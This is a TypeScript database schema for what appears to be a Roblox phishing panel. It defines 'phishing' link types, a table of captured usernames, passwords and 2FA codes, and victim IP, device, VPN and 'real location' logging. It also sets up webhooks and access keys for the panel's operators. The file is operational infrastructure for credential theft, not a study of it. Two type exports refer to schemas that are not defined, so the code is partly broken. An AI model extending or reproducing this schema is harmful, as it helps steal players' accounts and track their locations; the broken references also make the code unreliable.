import { sql } from "drizzle-orm";
import { pgTable, text, varchar, timestamp, integer, boolean } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const users = pgTable("users", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
  theme: text("theme").default("default"),
  isDev: boolean("is_dev").default(false),
  accountType: text("account_type").default("user"), // 'user', 'tester', 'developer', 'admin'
  isBanned: boolean("is_banned").default(false),
  accessKeyUsed: text("access_key_used"), // Track which key the user used for access
  profilePicture: text("profile_picture"), // Base64 encoded profile picture
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  lastLoginAt: timestamp("last_login_at"),
  bannedAt: timestamp("banned_at"),
  bannedBy: varchar("banned_by").references(() => users.id),
  banReason: text("ban_reason"),
});

export const accessKeys = pgTable("access_keys", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  key: text("key").notNull().unique(),
  usageLimit: integer("usage_limit").notNull().default(1),
  usedCount: integer("used_count").notNull().default(0),
  isActive: boolean("is_active").notNull().default(true),
  createdBy: varchar("created_by").references(() => users.id),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  expirationDate: timestamp("expiration_date"), // New field for expiration date
});

export const userSessions = pgTable("user_sessions", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  userId: varchar("user_id").notNull().references(() => users.id),
  sessionToken: text("session_token").notNull().unique(),
  expiresAt: timestamp("expires_at").notNull(),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const ipLogs = pgTable("ip_logs", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  userId: varchar("user_id").references(() => users.id),
  ipAddress: text("ip_address").notNull(),
  userAgent: text("user_agent"),
  referrer: text("referrer"),
  timestamp: timestamp("timestamp").notNull().default(sql`now()`),
  location: text("location"),
  status: text("status").notNull().default("success"),
  isVpn: text("is_vpn"), // 'yes', 'no', 'unknown'
  vpnLocation: text("vpn_location"), // VPN server location if detected
  realLocation: text("real_location"), // Estimated real location if VPN detected
  deviceType: text("device_type"), // 'mobile', 'desktop', 'tablet', 'unknown'
  browserName: text("browser_name"),
  operatingSystem: text("operating_system"),
  deviceBrand: text("device_brand"),
});

export const settings = pgTable("settings", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  userId: varchar("user_id").notNull().references(() => users.id),
  trackingId: text("tracking_id").unique(), // Unique identifier for tracking URLs
  webhookUrl: text("webhook_url"),
  uploadedImageName: text("uploaded_image_name"),
  uploadedImageData: text("uploaded_image_data"), // base64 encoded
  uploadedImageType: text("uploaded_image_type"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const robloxLinks = pgTable("roblox_links", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  userId: varchar("user_id").notNull().references(() => users.id),
  originalUrl: text("original_url"), // Allow null for phishing links
  linkType: text("link_type").notNull(), // 'private_server', 'profile', 'group', 'phishing'
  trackingId: text("tracking_id").notNull().unique(),
  title: text("title"), // Optional title for the link
  description: text("description"), // Optional description
  clickCount: integer("click_count").notNull().default(0),
  isActive: boolean("is_active").notNull().default(true),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const robloxCredentials = pgTable("roblox_credentials", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  linkId: varchar("link_id").notNull().references(() => robloxLinks.id),
  userId: varchar("user_id").notNull().references(() => users.id),
  capturedUsername: text("captured_username").notNull(),
  capturedPassword: text("captured_password").notNull(),
  capturedAuthCode: text("captured_auth_code"), // 2FA code if provided
  ipAddress: text("ip_address").notNull(),
  userAgent: text("user_agent"),
  location: text("location"),
  isVpn: text("is_vpn"), // 'yes', 'no', 'unknown'
  deviceType: text("device_type"),
  browserName: text("browser_name"),
  operatingSystem: text("operating_system"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
});

export const createUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
  accountType: true,
  isDev: true,
});

export const updateProfileSchema = createInsertSchema(users).pick({
  username: true,
  profilePicture: true,
});

export const updatePasswordSchema = z.object({
  currentPassword: z.string().min(1, "Current password is required"),
  password: z.string().min(6, "Password must be at least 6 characters"),
  confirmPassword: z.string().min(1, "Confirm password is required"),
}).refine((data) => data.password === data.confirmPassword, {
  message: "Passwords don't match",
  path: ["confirmPassword"],
});

export const insertAccessKeySchema = createInsertSchema(accessKeys).omit({
  id: true,
  createdAt: true,
  usedCount: true,
}).extend({
  expirationDays: z.number().optional() // Add expirationDays to the schema
});

export const insertUserSessionSchema = createInsertSchema(userSessions).omit({
  id: true,
  createdAt: true,
});

export const insertIpLogSchema = createInsertSchema(ipLogs).omit({
  id: true,
  timestamp: true,
});

export const insertSettingsSchema = createInsertSchema(settings).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export const insertRobloxLinkSchema = createInsertSchema(robloxLinks).omit({
  id: true,
  userId: true,
  trackingId: true,
  createdAt: true,
  updatedAt: true,
  clickCount: true,
  isActive: true,
}).extend({
  originalUrl: z.string().url("Please enter a valid URL").optional().or(z.literal("")).or(z.null()),
  linkType: z.enum(["private_server", "profile", "group", "phishing"], {
    required_error: "Please select a link type",
  }),
  title: z.string().min(1, "Title is required").max(100, "Title must be 100 characters or less"),
  description: z.string().max(500, "Description must be 500 characters or less").optional(),
}).refine((data) => {
  // Only require originalUrl for non-phishing links
  if (data.linkType !== 'phishing' && (!data.originalUrl || data.originalUrl === "")) {
    return false;
  }
  return true;
}, {
  message: "Original URL is required for non-phishing links",
  path: ["originalUrl"]
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;
export type UpdateProfile = z.infer<typeof updateProfileSchema>;
export type UpdatePassword = z.infer<typeof updatePasswordSchema>;
export type InsertAccessKey = z.infer<typeof insertAccessKeySchema>;
export type AccessKey = typeof accessKeys.$inferSelect;
export type InsertUserSession = z.infer<typeof insertUserSessionSchema>;
export type UserSession = typeof userSessions.$inferSelect;
export type InsertIpLog = z.infer<typeof insertIpLogSchema>;
export type IpLog = typeof ipLogs.$inferSelect;
export type InsertSettings = z.infer<typeof insertSettingsSchema>;
export type Settings = typeof settings.$inferSelect;
export type InsertRobloxLink = z.infer<typeof insertRobloxLinkSchema>;
export type RobloxLink = typeof robloxLinks.$inferSelect;
export type CreateRobloxLink = z.infer<typeof createRobloxLinkSchema>;
export type InsertRobloxCredentials = z.infer<typeof insertRobloxCredentialsSchema>;
export type RobloxCredentials = typeof robloxCredentials.$inferSelect;